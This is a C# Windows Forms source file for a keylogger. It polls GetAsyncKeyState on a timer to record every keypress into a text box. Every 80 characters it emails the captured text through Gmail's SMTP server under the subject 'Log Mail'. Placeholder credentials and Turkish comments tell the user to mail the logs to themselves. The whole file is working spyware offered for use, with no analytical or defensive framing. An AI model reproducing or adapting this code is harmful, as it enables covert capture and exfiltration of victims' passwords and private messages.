    using System;
    using System.Collections.Generic;
    using System.ComponentModel;
    using System.Data;
    using System.Drawing;
    using System.Linq;
    using System.Text;
    using System.Threading.Tasks;
    using System.Windows.Forms;
    using System.Runtime.InteropServices;
    using System.Net;
    using System.Net.Mail;

namespace WindowsFormsApp1
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            richTextBox1.TextChanged += richTextBox1_TextChanged;
        }

        private void richTextBox1_TextChanged(object sender, EventArgs e)
        {
            if (richTextBox1.Text.Length >= 80)
            {
                SendMail(richTextBox1.Text);
                richTextBox1.Clear();
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            timer1.Start();
        }

        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(int vKey);
        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(Keys vKey);

        public void Read()
        {
            try
            {
                foreach(int i in Enum.GetValues(typeof(Keys)))
                {
                    if(GetAsyncKeyState(i) == -32767)
                    {
                        richTextBox1.Text += Enum.GetName(typeof(Keys), i);
                    }
                }
            }
            catch (Exception)
            {
                throw;
            }
        }

        private void SendMail(string icerik)
        {
            string senderEmail = "YourAdress@gmail.com"; // kendi mailin
            string password = "Your_App_Password";         // uygulama şifren
            string RecieverEmail = "YourAdress@gmail.com";    // kendine gönderiyorsun

            SmtpClient smtp = new SmtpClient("smtp.gmail.com", 587);
            smtp.Credentials = new NetworkCredential(senderEmail, password);
            smtp.EnableSsl = true;

            MailMessage mail = new MailMessage();
            mail.From = new MailAddress(senderEmail);
            mail.To.Add(RecieverEmail);
            mail.Subject = "Log Mail";
            mail.Body = icerik;

            smtp.Send(mail);
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            Read();
        }
    }
}